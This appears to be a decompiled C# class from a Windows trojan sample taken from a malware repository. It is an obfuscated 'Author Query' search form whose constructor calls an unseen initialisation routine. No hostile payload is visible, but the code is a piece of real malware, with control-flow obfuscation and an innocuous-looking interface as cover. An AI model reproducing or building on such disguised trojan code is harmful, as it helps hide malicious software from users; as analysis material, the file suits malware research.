// Decompiled with JetBrains decompiler
// Type: ProjNet.Common.SystemAdvisor
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using ProjNet.Services;
using ProjNet.Structs;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ProjNet.Common
{
  public class SystemAdvisor : Form
  {
    private bool serializerAdvisor;
    private IContainer queueAdvisor;
    private GroupBox m_ProccesorAdvisor;
    private RadioButton _PredicateAdvisor;
    private RadioButton propertyAdvisor;
    private TextBox _ParserAdvisor;
    private Button _InterpreterAdvisor;
    private Label configurationAdvisor;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public SystemAdvisor()
    {
      int num1 = 5;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            goto case 3;
          case 1:
          case 2:
            this.queueAdvisor = (IContainer) null;
            num1 = 0;
            continue;
          case 3:
          case 4:
            this.StopFacade();
            this.serializerAdvisor = true;
            num1 = 6;
            continue;
          case 5:
            PageAdvisorStructBuilder.PrepareCreator();
            num2 = 2;
            break;
          case 6:
            goto label_8;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void OrderFacade(object first, EventArgs cust) => this.serializerAdvisor = true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RestartFacade(object param, EventArgs caller) => this.serializerAdvisor = false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void EnableFacade(object v, EventArgs cont)
    {
      try
      {
        bool serializerAdvisor = this.serializerAdvisor;
        int num1 = 2;
        if (false)
          return;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              if (!serializerAdvisor)
              {
                int num2 = (int) MessageBox.Show(CallbackRegistry.RateAdvisor(this._ParserAdvisor.Text).ToString());
                num1 = 4;
                continue;
              }
              goto label_5;
            case 1:
              goto label_10;
            case 3:
              goto label_11;
            case 4:
              goto label_8;
            default:
              num1 = 3;
              continue;
          }
        }
label_5:
        int num3 = (int) MessageBox.Show(CallbackRegistry.InstantiateAdvisor(this._ParserAdvisor.Text).ToString());
        return;
label_10:
        return;
label_11:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Author not found!");
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool forcevar1)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 0:
            case 3:
              if (!forcevar1)
              {
                num3 = 0;
                goto label_5;
              }
              else
                goto label_11;
            case 1:
label_3:
              num3 = this.queueAdvisor != null ? 1 : 0;
              goto label_5;
            case 2:
            case 4:
label_1:
              break;
            case 5:
              goto label_13;
            default:
              num2 = 4;
              continue;
          }
label_2:
          base.Dispose(forcevar1);
          if (true)
          {
            num2 = 5;
            continue;
          }
          goto label_3;
label_5:
          if (num3 != 0)
          {
            this.queueAdvisor.Dispose();
            goto label_1;
          }
          else
            goto label_2;
        }
label_11:
        num1 = 1;
      }
label_13:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void StopFacade()
    {
      int num1 = 12;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 12:
              goto label_10;
            case 1:
              this._PredicateAdvisor.Name = "radioButton2";
              this._PredicateAdvisor.Size = new Size(76, 17);
              this._PredicateAdvisor.TabIndex = 1;
              this._PredicateAdvisor.TabStop = true;
              this._PredicateAdvisor.Text = "Last Name";
              this._PredicateAdvisor.UseVisualStyleBackColor = true;
              this._PredicateAdvisor.CheckedChanged += new EventHandler(this.RestartFacade);
              this.propertyAdvisor.AutoSize = true;
              this.propertyAdvisor.Location = new Point(6, 19);
              num2 = 2;
              continue;
            case 2:
              this.propertyAdvisor.Name = "radioButton1";
              this.propertyAdvisor.Size = new Size(36, 17);
              this.propertyAdvisor.TabIndex = 0;
              this.propertyAdvisor.TabStop = true;
              this.propertyAdvisor.Text = "ID";
              this.propertyAdvisor.UseVisualStyleBackColor = true;
              this.propertyAdvisor.CheckedChanged += new EventHandler(this.OrderFacade);
              this._ParserAdvisor.Location = new Point(16, 117);
              this._ParserAdvisor.Name = "parameterBox";
              this._ParserAdvisor.Size = new Size(100, 20);
              goto case 9;
            case 3:
              this.configurationAdvisor.TabIndex = 4;
              num2 = 16;
              continue;
            case 4:
              this.m_ProccesorAdvisor.Size = new Size(197, 46);
              this.m_ProccesorAdvisor.TabIndex = 0;
              this.m_ProccesorAdvisor.TabStop = false;
              if (true)
              {
                num2 = 11;
                continue;
              }
              goto case 13;
            case 5:
              this._PredicateAdvisor.AutoSize = true;
              num2 = 17;
              continue;
            case 6:
              goto label_16;
            case 7:
              this.m_ProccesorAdvisor.PerformLayout();
              this.ResumeLayout(false);
              this.PerformLayout();
              if (true)
              {
                num2 = 19;
                continue;
              }
              goto case 5;
            case 8:
              this.Controls.Add((Control) this._InterpreterAdvisor);
              this.Controls.Add((Control) this._ParserAdvisor);
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto case 1;
            case 9:
            case 10:
              this._ParserAdvisor.TabIndex = 2;
              this._InterpreterAdvisor.Location = new Point(138, 114);
              this._InterpreterAdvisor.Name = "button1";
              this._InterpreterAdvisor.Size = new Size(75, 23);
              this._InterpreterAdvisor.TabIndex = 3;
              this._InterpreterAdvisor.Text = "Search";
              this._InterpreterAdvisor.UseVisualStyleBackColor = true;
              num2 = 18;
              continue;
            case 11:
              goto label_18;
            case 13:
              this._PredicateAdvisor = new RadioButton();
              this.propertyAdvisor = new RadioButton();
              this._ParserAdvisor = new TextBox();
              this._InterpreterAdvisor = new Button();
              this.configurationAdvisor = new Label();
              this.m_ProccesorAdvisor.SuspendLayout();
              this.SuspendLayout();
              this.m_ProccesorAdvisor.Controls.Add((Control) this._PredicateAdvisor);
              num2 = 15;
              continue;
            case 14:
              goto label_9;
            case 15:
              goto label_11;
            case 16:
              goto label_14;
            case 17:
              goto label_4;
            case 18:
              goto label_17;
            case 19:
              goto label_21;
            default:
              goto label_8;
          }
        }
label_4:
        this._PredicateAdvisor.Location = new Point(63, 19);
        num1 = 1;
        continue;
label_8:
        num1 = 10;
        continue;
label_9:
        this.configurationAdvisor.Size = new Size(95, 13);
        num1 = 3;
        continue;
label_10:
        this.m_ProccesorAdvisor = new GroupBox();
        num1 = 13;
        continue;
label_11:
        this.m_ProccesorAdvisor.Controls.Add((Control) this.propertyAdvisor);
        this.m_ProccesorAdvisor.Location = new Point(16, 12);
        this.m_ProccesorAdvisor.Name = "groupBox1";
        num1 = 4;
        continue;
label_14:
        this.configurationAdvisor.Text = "Search Parameter:";
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        this.AutoScaleMode = AutoScaleMode.Font;
        this.ClientSize = new Size(232, 153);
        this.Controls.Add((Control) this.configurationAdvisor);
        num1 = 8;
        continue;
label_16:
        this.Controls.Add((Control) this.m_ProccesorAdvisor);
        this.Name = "QueryAuthor";
        this.Text = "Author Query";
        this.m_ProccesorAdvisor.ResumeLayout(false);
        num1 = 7;
        continue;
label_17:
        this._InterpreterAdvisor.Click += new EventHandler(this.EnableFacade);
        this.configurationAdvisor.AutoSize = true;
        this.configurationAdvisor.Location = new Point(16, 86);
        this.configurationAdvisor.Name = "label1";
        num1 = 14;
        continue;
label_18:
        this.m_ProccesorAdvisor.Text = "Search Type";
        num1 = 5;
      }
label_21:;
    }

    internal static bool DestroyModel() => true;

    internal static bool PostModel() => false;
  }
}
